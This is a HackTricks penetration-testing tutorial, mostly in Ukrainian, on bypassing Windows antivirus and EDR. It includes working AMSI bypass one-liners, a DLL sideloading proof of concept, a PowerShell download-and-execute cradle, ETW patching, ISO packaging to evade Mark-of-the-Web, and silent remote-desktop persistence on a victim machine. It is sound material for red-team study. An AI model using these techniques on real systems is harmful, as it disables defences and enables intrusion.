# Обхід антивірусів (AV)

{{#include ../banners/hacktricks-training.md}}

**Цю сторінку написав** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Зупинити Defender

- [defendnot](https://github.com/es3n1n/defendnot): Інструмент для припинення роботи Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): Інструмент для припинення роботи Windows Defender шляхом імітації іншого AV.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

## **AV Evasion Methodology**

Наразі AV використовують різні методи для визначення, чи є файл шкідливим: static detection, dynamic analysis, та для більш просунутих EDR — behavioural analysis.

### **Static detection**

Static detection досягається шляхом позначення відомих шкідливих рядків або масивів байтів у бінарному файлі чи скрипті, а також шляхом вилучення інформації з самого файлу (наприклад, file description, company name, digital signatures, icon, checksum тощо). Це означає, що використання відомих публічних інструментів може легше привести до виявлення, оскільки їх, ймовірно, вже проаналізовано й позначено як шкідливі. Є кілька способів обійти такого роду детекцію:

- **Шифрування**

Якщо ви зашифруєте бінарник, AV не зможе його виявити, але вам знадобиться якийсь лоадер, щоб розшифрувати і запустити програму в пам'яті.

- **Обфускація**

Іноді достатньо змінити деякі рядки у бінарнику чи скрипті, щоб пройти повз AV, але це може бути трудомістким завданням залежно від того, що ви намагаєтеся обфускувати.

- **Власні інструменти**

Якщо ви розробите власні інструменти, відомих сигнатур не буде, але це займає багато часу й зусиль.

> [!TIP]
> Хороший спосіб перевірити статичну детекцію Windows Defender — [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Воно фактично розбиває файл на кілька сегментів і змушує Defender сканувати кожен окремо; таким чином можна точно дізнатися, які рядки чи байти у вашому бінарнику позначені.

Раджу переглянути цю [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) про практичний AV Evasion.

### **Dynamic analysis**

Dynamic analysis — це коли AV запускає ваш бінарник у sandbox і спостерігає за шкідливою активністю (наприклад, спроби розшифрувати й прочитати паролі браузера, зробити minidump процесу LSASS тощо). Цю частину трохи складніше обходити, але ось кілька речей, які ви можете зробити, щоб уникнути sandbox:

- **Sleep before execution** Залежно від реалізації це може бути чудовим способом обійти dynamic analysis AV. AV мають дуже мало часу на сканування файлів, щоб не переривати роботу користувача, тому використання довгих пауз може порушити аналіз бінарників. Проблема в тому, що багато sandbox AV можуть просто пропустити такі паузи залежно від реалізації.
- **Checking machine's resources** Зазвичай у sandbox мало ресурсів (наприклад, < 2GB RAM), інакше вони могли б уповільнювати машину користувача. Тут можна бути креативним: перевіряти температуру CPU або швидкість обертання вентиляторів — не все реалізовано в sandbox.
- **Machine-specific checks** Якщо ви хочете націлитися на користувача, робоча станція якого приєднана до домену "contoso.local", ви можете перевірити домен комп'ютера: якщо він не збігається з вказаним, програма може завершити роботу.

Виявилося, що computername sandbox Microsoft Defender — HAL9TH, тому можна перевірити ім'я комп'ютера у вашому malware перед активацією: якщо ім'я співпадає з HAL9TH, це означає, що ви всередині sandbox Defender, і можна завершити роботу програми.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Декілька інших дуже корисних порад від [@mgeeky](https://twitter.com/mariuszbit) щодо обходу Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Як вже згадувалося раніше, **публічні інструменти** рано чи пізно **будуть виявлені**, тож варто задуматися:

Наприклад, якщо ви хочете дампити LSASS, **чи справді потрібно використовувати mimikatz**? Чи можна скористатися іншим проєктом, менш відомим, який теж дампить LSASS.

Правильна відповідь, ймовірно, остання. На прикладі mimikatz — це, мабуть, один із, якщо не найбільш, позначених шматків "malware" AV та EDR; проєкт класний, але з ним справді складно обійти AV, тож просто шукайте альтернативи для досягнення вашої мети.

> [!TIP]
> При модифікації payload-ів для обходу обов'язково **вимкніть автоматичну відправку зразків** у Defender, і, будь ласка, серйозно, **НЕ ЗАВАНТАЖУЙТЕ НА VIRUSTOTAL**, якщо ваша мета — довгостроковий обход. Якщо хочете перевірити, чи виявляє конкретний AV ваш payload, встановіть його на VM, спробуйте вимкнути автоматичну відправку зразків і тестуйте там, доки не будете задоволені результатом.

## EXEs vs DLLs

Коли це можливо, завжди **надавайте пріоритет використанню DLLs для обходу**; за моїм досвідом, DLL-файли зазвичай **набагато рідше виявляються** й аналізуються, тому це дуже простий трюк для уникнення детекції в деяких випадках (якщо ваш payload може виконуватися як DLL, звісно).

Як видно на цьому зображенні, DLL Payload від Havoc має рівень виявлення 4/26 на antiscan.me, тоді як EXE payload має 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Тепер ми покажемо кілька трюків, які можна використовувати з DLL-файлами, щоб бути набагато непомітнішими.

## DLL Sideloading & Proxying

**DLL Sideloading** використовує порядок пошуку DLL, який використовує loader, розміщуючи додаток-жертву та шкідливі payload(s) поруч один з одним.

You can check for programs susceptible to DLL Sideloading using [Siofra](https://github.com/Cybereason/siofra) and the following powershell script:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Ця команда виведе список програм, вразливих до DLL hijacking, у папці "C:\Program Files\\" та DLL files, які вони намагаються завантажити.

Я настійно рекомендую вам **explore DLL Hijackable/Sideloadable programs yourself**, ця техніка досить прихована при правильному виконанні, але якщо ви використовуєте публічно відомі DLL Sideloadable програми, вас можуть легко викрити.

Просте розміщення шкідливого DLL з ім'ям, яке програма очікує завантажити, не призведе до виконання вашого payload, оскільки програма очікує певних специфічних функцій у цій DLL; щоб вирішити цю проблему, ми використаємо іншу техніку під назвою **DLL Proxying/Forwarding**.

**DLL Proxying** перенаправляє виклики, які програма робить, з проксі (і шкідливої) DLL до оригінальної DLL, зберігаючи функціональність програми та дозволяючи обробляти виконання вашого payload.

Я буду використовувати проект [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) від [@flangvik](https://twitter.com/Flangvik/)

Ось кроки, які я виконав:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Остання команда дасть нам 2 файли: шаблон вихідного коду DLL та оригінальну перейменовану DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

І наш shellcode (зашифрований за допомогою [SGN](https://github.com/EgeBalci/sgn)) і proxy DLL мають рейтинг виявлення 0/26 на [antiscan.me](https://antiscan.me)! Я вважаю це успіхом.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Я **категорично рекомендую** вам переглянути [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) про DLL Sideloading, а також [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE), щоб більш детально ознайомитися з тим, що ми обговорювали.

### Зловживання перенаправленими експортами (ForwardSideLoading)

Windows PE-модулі можуть експортувати функції, які насправді є "forwarders": замість вказівки на код, запис експорту містить ASCII-рядок формату `TargetDll.TargetFunc`. Коли викликач вирішує цей експорт, Windows loader виконає:

- Load `TargetDll` if not already loaded
- Resolve `TargetFunc` from it

Ключові моменти для розуміння:
- Якщо `TargetDll` є KnownDLL, він постачається з захищеного простору імен KnownDLLs (e.g., ntdll, kernelbase, ole32).
- Якщо `TargetDll` не є KnownDLL, використовується звичайний порядок пошуку DLL, який включає директорію модуля, що виконує forward resolution.

Це дає змогу використати непрямий примітив sideloading: знайдіть підписану DLL, яка експортує функцію, перенаправлену до імені модуля, що не є KnownDLL, потім помістіть цю підписану DLL у ту саму директорію разом із attacker-controlled DLL, яка має точно таке ж ім'я, як цільовий модуль у перенаправленні. Коли викликається the forwarded export, the loader обробляє перенаправлення і завантажує вашу DLL з тієї ж директорії, виконуючи ваш DllMain.

Example observed on Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` не є KnownDLL, тому він завантажується за звичайним порядком пошуку.

PoC (копіювання та вставка):
1) Скопіюйте підписаний системний DLL у папку з правами запису
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Помістіть шкідливий `NCRYPTPROV.dll` у ту саму папку. Достатньо мінімального DllMain, щоб отримати виконання коду; вам не потрібно реалізовувати forwarded function, щоб викликати DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Спровокуйте пересилання за допомогою підписаного LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Спостережувана поведінка:
- rundll32 (підписаний) завантажує side-by-side `keyiso.dll` (підписаний)
- Під час вирішення `KeyIsoSetAuditingInterface` завантажувач переходить за перенаправленням до `NCRYPTPROV.SetAuditingInterface`
- Потім завантажувач завантажує `NCRYPTPROV.dll` з `C:\test` і виконує його `DllMain`
- Якщо `SetAuditingInterface` не реалізований, ви отримаєте помилку "missing API" лише після того, як `DllMain` вже виконано

Hunting tips:
- Зосередьтеся на перенаправлених експортах, де цільовий модуль не є KnownDLL. KnownDLLs перелічені під `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Ви можете перерахувати перенаправлені експорти за допомогою інструментів, таких як:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Перегляньте Windows 11 forwarder inventory, щоб знайти кандидатів: https://hexacorn.com/d/apis_fwd.txt

Detection/defense ideas:
- Моніторити LOLBins (e.g., rundll32.exe), які завантажують підписані DLL з не-системних шляхів, а потім завантажують non-KnownDLLs з тією ж базовою назвою з цього каталогу
- Сповіщати про ланцюжки процесів/модулів типу: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` у шляхах, доступних для запису користувачем
- Застосовувати політики цілісності коду (WDAC/AppLocker) та забороняти write+execute у каталогах додатків

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Ви можете використати Freeze, щоб завантажити та виконати ваш shellcode приховано.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Уникнення детекції — це лише гра в кішку й мишку: те, що працює сьогодні, може бути виявлено завтра, тож ніколи не покладайтеся лише на один інструмент; якщо можливо, намагайтеся поєднувати кілька технік ухилення.

## AMSI (Anti-Malware Scan Interface)

AMSI було створено, щоб запобігти "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Спочатку AV могли сканувати лише **файли на диску**, тож якщо якось виконати payloads **безпосередньо в пам'яті**, AV нічого не міг зробити, бо не мав достатньої видимості.

Функція AMSI інтегрована в ці компоненти Windows.

- User Account Control, or UAC (підвищення привілеїв EXE, COM, MSI або встановлення ActiveX)
- PowerShell (скрипти, інтерактивне використання та динамічна оцінка коду)
- Windows Script Host (wscript.exe та cscript.exe)
- JavaScript та VBScript
- Office VBA macros

Це дозволяє антивірусам інспектувати поведінку скриптів, надаючи вміст скриптів у формі, яка не зашифрована й не обфусована.

Запуск `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` згенерує наступне попередження у Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Зверніть увагу, як воно додає спереду `amsi:` та потім шлях до виконуваного файлу, з якого був запущений скрипт — у цьому випадку powershell.exe

Ми не записували файл на диск, але все одно були виявлені в пам'яті через AMSI.

Більш того, починаючи з **.NET 4.8**, C# код також проходить через AMSI. Це навіть впливає на `Assembly.Load(byte[])` для завантаження виконання в пам'яті. Ось чому для виконання в пам'яті, якщо ви хочете оминати AMSI, рекомендовано використовувати нижчі версії .NET (наприклад, 4.7.2 або нижче).

Є кілька способів обійти AMSI:

- **Obfuscation**

Оскільки AMSI в основному працює зі статичними детекціями, зміна скриптів, які ви намагаєтесь завантажити, може бути хорошим способом уникнути виявлення.

Однак AMSI має можливість розобфусувати скрипти навіть коли вони мають кілька шарів обфускації, тож обфускація може виявитися поганим варіантом залежно від того, як вона виконана. Це ускладнює ухилення. Проте іноді достатньо змінити кілька імен змінних — і все буде добре, тож усе залежить від того, наскільки щось було позначено.

- **AMSI Bypass**

Оскільки AMSI реалізовано шляхом завантаження DLL у процес powershell (також cscript.exe, wscript.exe тощо), його можна легко підправити навіть при запуску від імені непривілейованого користувача. Через цю помилку в реалізації AMSI дослідники знайшли кілька способів обійти сканування AMSI.

**Forcing an Error**

Примусове спричинення збою ініціалізації AMSI (amsiInitFailed) призведе до того, що для поточного процесу сканування не буде ініційовано. Спочатку це оприлюднив [Matt Graeber](https://twitter.com/mattifestation), і Microsoft розробила сигнатуру, щоб запобігти широкому використанню.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Усього один рядок коду powershell зробив AMSI непридатним для поточного процесу powershell. Цей рядок, звісно, був відзначений самим AMSI, тому для використання цієї техніки потрібні певні модифікації.

Ось модифікований AMSI bypass, який я взяв із цього [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Keep in mind, that this will probably get flagged once this post comes out, so you should not publish any code if your plan is staying undetected.

**Memory Patching**

This technique was initially discovered by [@RastaMouse](https://twitter.com/_RastaMouse/) and it involves finding address for the "AmsiScanBuffer" function in amsi.dll (responsible for scanning the user-supplied input) and overwriting it with instructions to return the code for E_INVALIDARG, this way, the result of the actual scan will return 0, which is interpreted as a clean result.

> [!TIP]
> Будь ласка, прочитайте [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) для детальнішого пояснення.

There are also many other techniques used to bypass AMSI with powershell, check out [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.

This tools [**https://github.com/Flangvik/AMSI.fail**](https://github.com/Flangvik/AMSI.fail) also generates script to bypass AMSI.

**Remove the detected signature**

You can use a tool such as **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** and **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** to remove the detected AMSI signature from the memory of the current process. This tool works by scanning the memory of the current process for the AMSI signature and then overwriting it with NOP instructions, effectively removing it from memory.

**AV/EDR products that uses AMSI**

You can find a list of AV/EDR products that uses AMSI in **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Use Powershell version 2**
If you use PowerShell version 2, AMSI will not be loaded, so you can run your scripts without being scanned by AMSI. You can do this:
```bash
powershell.exe -version 2
```
## Логування PowerShell

PowerShell logging — це функція, яка дозволяє реєструвати всі команди PowerShell, виконані в системі. Це корисно для аудиту та усунення несправностей, але також може бути великою проблемою для атакуючих, які хочуть уникнути виявлення.

Щоб обійти логування PowerShell, можна використовувати такі підходи:

- **Disable PowerShell Transcription and Module Logging**: Можна використати інструмент, такий як [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs).
- **Use Powershell version 2**: Якщо використовувати PowerShell версії 2, AMSI не буде завантажено, тож ви зможете виконувати свої скрипти без сканування AMSI. Можна зробити так: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Використайте [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell), щоб створити powershell без захисту (це те, що використовує `powerpick` з Cobal Strike).


## Обфускація

> [!TIP]
> Декілька технік обфускації покладаються на шифрування даних, що збільшує ентропію бінарника і полегшує виявлення AVs та EDRs. Будьте обережні з цим і, можливо, застосовуйте шифрування тільки до конкретних секцій коду, які є чутливими або їх потрібно приховати.

### Деобфускація .NET-бінарників, захищених ConfuserEx

Під час аналізу шкідливого ПО, яке використовує ConfuserEx 2 (або комерційні форки), часто зустрічаються кілька шарів захисту, які блокують декомпілятори та пісочниці. Наведений нижче робочий процес надійно відновлює майже оригінальний IL, який потім можна декомпілювати в C# за допомогою dnSpy або ILSpy.

1.  Anti-tampering removal – ConfuserEx шифрує кожне *method body* і дешифрує його всередині статичного конструктора модуля (`<Module>.cctor`). Це також змінює PE checksum, тож будь-яка модифікація призведе до краху бінарника. Використайте **AntiTamperKiller**, щоб знайти зашифровані таблиці метаданих, відновити XOR-ключі та переписати чисту збірку:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Вивід містить 6 анти-темпер параметрів (`key0-key3`, `nameHash`, `internKey`), які можуть бути корисні при побудові власного unpacker'а.

2.  Symbol / control-flow recovery – передайте *clean* файл у **de4dot-cex** (форк de4dot з підтримкою ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – вибрати профіль ConfuserEx 2  
• de4dot скасує control-flow flattening, відновить оригінальні простори імен, класи та імена змінних і дешифрує константні рядки.

3.  Proxy-call stripping – ConfuserEx замінює прямі виклики методів легкими обгортками (т.з. *proxy calls*), щоб ускладнити декомпіляцію. Видаліть їх за допомогою **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Після цього кроку ви повинні побачити звичайні .NET API, такі як `Convert.FromBase64String` або `AES.Create()`, замість непрозорих обгорткових функцій (`Class8.smethod_10`, …).

4.  Manual clean-up – запустіть отриманий бінарник у dnSpy, шукайте великі Base64-блоки або використання `RijndaelManaged`/`TripleDESCryptoServiceProvider`, щоб знайти *реальний* payload. Часто шкідливе ПО зберігає його як TLV-кодований масив байтів, ініціалізований всередині `<Module>.byte_0`.

Наведений ланцюжок відновлює потік виконання **без** необхідності запускати шкідливий зразок — корисно при роботі на офлайн-робочій станції.

> 🛈  ConfuserEx генерує власний атрибут із назвою `ConfusedByAttribute`, який можна використовувати як IOC для автоматичної триажі зразків.

#### Однорядковий приклад
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Мета цього проєкту — надати open-source форк збірки компіляторів [LLVM](http://www.llvm.org/), здатний підвищувати безпеку ПЗ через [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) та захист від підтасовування.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator демонструє, як використовувати мову `C++11/14` для генерації на етапі компіляції заобфускованого коду без використання зовнішніх інструментів і без модифікації компілятора.
- [**obfy**](https://github.com/fritzone/obfy): Додає шар заобфускованих операцій, згенерованих C++ template metaprogramming framework, що ускладнить життя тому, хто хоче crack the application.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz — x64 binary obfuscator, який здатен обфускувати різні pe files, включаючи: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame — простий metamorphic code engine для довільних виконуваних файлів.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator — це тонкоґранітна code obfuscation framework для мов, що підтримуються LLVM, яка використовує ROP (return-oriented programming). ROPfuscator обфускує програму на рівні assembly-коду, перетворюючи звичайні інструкції на ROP-чейн-и, руйнуючи наше природне уявлення про нормальний контроль потоку.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt — .NET PE Crypter, написаний на Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor вміє конвертувати існуючі EXE/DLL у shellcode та потім їх завантажувати

## SmartScreen & MoTW

You may have seen this screen when downloading some executables from the internet and executing them.

Microsoft Defender SmartScreen is a security mechanism intended to protect the end user against running potentially malicious applications.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen mainly works with a reputation-based approach, meaning that uncommonly download applications will trigger SmartScreen thus alerting and preventing the end user from executing the file (although the file can still be executed by clicking More Info -> Run anyway).

**MoTW** (Mark of The Web) is an [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) with the name of Zone.Identifier which is automatically created upon download files from the internet, along with the URL it was downloaded from.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Перевірка Zone.Identifier ADS для файлу, завантаженого з інтернету.</p></figcaption></figure>

> [!TIP]
> Важливо зазначити, що виконувані файли, підписані **довіреним** сертифікатом підпису, **не спричинять активацію SmartScreen**.

A very effective way to prevent your payloads from getting the Mark of The Web is by packaging them inside some sort of container like an ISO. This happens because Mark-of-the-Web (MOTW) **cannot** be applied to **non NTFS** volumes.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) is a tool that packages payloads into output containers to evade Mark-of-the-Web.

Приклад використання:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) — це потужний механізм логування в Windows, який дозволяє додаткам і системним компонентам **реєструвати події**. Однак його також можуть використовувати продукти безпеки для моніторингу й виявлення шкідливої активності.

Подібно до того, як AMSI відключається (обходиться), також можна змусити функцію користувацького простору `EtwEventWrite` повертатися негайно без реєстрації подій. Це робиться шляхом патчу функції в пам’яті, щоб вона негайно повертала контроль, фактично вимикаючи ETW-логування для цього процесу.

Більше інформації можна знайти в **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Завантаження C# бінарників у пам’ять відоме вже давно і залишається чудовим способом запуску post-exploitation інструментів без виявлення AV.

Оскільки payload буде завантажений безпосередньо в пам’ять без запису на диск, нам залишиться лише потурбуватися про патчинг AMSI для всього процесу.

Більшість C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, тощо) вже надають можливість виконувати C# assemblies безпосередньо в пам’яті, але існують різні підходи:

- **Fork\&Run**

Це передбачає **створення нового "жертвеного" процесу**, інжекцію вашого post-exploitation шкідливого коду в цей новий процес, виконання коду і після завершення — завершення процесу. У цього методу є як переваги, так і недоліки. Перевага Fork and Run в тому, що виконання відбувається **поза** процесом нашого Beacon імпланту. Це означає, що якщо щось піде не так або буде виявлено під час нашої post-exploitation дії, існує **набагато більша ймовірність**, що наш **імплант виживе.** Недолік — більша ймовірність потрапити під виявлення поведінки (Behavioural Detections).

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Це інжекція post-exploitation шкідливого коду **в сам процес**. Таким чином можна уникнути створення нового процесу й його сканування AV, але недолік у тому, що якщо виконання payload піде не так, існує **набагато більша ймовірність** втратити ваш Beacon через можливий крах процесу.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Якщо хочете прочитати більше про завантаження C# Assembly, перегляньте цю статтю [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) та їхній InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Ви також можете завантажувати C# Assemblies **через PowerShell**, гляньте на [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) та відео S3cur3th1sSh1t ([https://www.youtube.com/watch?v=oe11Q-3Akuk](https://www.youtube.com/watch?v=oe11Q-3Akuk)).

## Using Other Programming Languages

Як запропоновано в [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), можливо виконувати шкідливий код іншими мовами, надавши скомпрометованій машині доступ **до інтерпретатора, встановленого на Attacker Controlled SMB share**.

Надавши доступ до Interpreter Binaries та середовища на SMB share, ви можете **виконувати довільний код цими мовами в пам’яті** скомпрометованої машини.

У репо зазначено: Defender все ще сканує скрипти, але використовуючи Go, Java, PHP тощо, ми отримуємо **більшу гнучкість для обходу статичних сигнатур**. Тестування з випадковими незаплутаними reverse shell скриптами цими мовами показало успіх.

## TokenStomping

Token stomping — техніка, яка дозволяє атакуючому **маніпулювати access token або токеном процесу безпеки, як-от EDR чи AV**, зменшуючи його привілеї так, що процес не вмирає, але не має прав для перевірки шкідливої активності.

Щоб запобігти цьому, Windows могла б **не дозволяти зовнішнім процесам** отримувати дескриптори токенів процесів безпеки.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Як описано в [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), легко встановити Chrome Remote Desktop на ПК жертви та використовувати його для takeover і підтримки persistence:
1. Download from https://remotedesktop.google.com/, click on "Set up via SSH", and then click on the MSI file for Windows to download the MSI file.
2. Run the installer silently in the victim (admin required): `msiexec /i chromeremotedesktophost.msi /qn`
3. Go back to the Chrome Remote Desktop page and click next. The wizard will then ask you to authorize; click the Authorize button to continue.
4. Execute the given parameter with some adjustments: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Note the pin param which allows to set the pin withuot using the GUI).


## Advanced Evasion

Evasion — дуже складна тема, іноді треба врахувати багато різних джерел телеметрії в одній системі, тому практично неможливо залишатися повністю незауваженим у зрілих середовищах.

Кожне середовище має власні сильні та слабкі сторони.

Раджу переглянути цей доповідь від [@ATTL4S](https://twitter.com/DaniLJ94), щоб отримати уявлення про більш просунуті техніки Evasion.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Це також чудова доповідь від [@mariuszbit](https://twitter.com/mariuszbit) про Evasion in Depth.


{{#ref}}
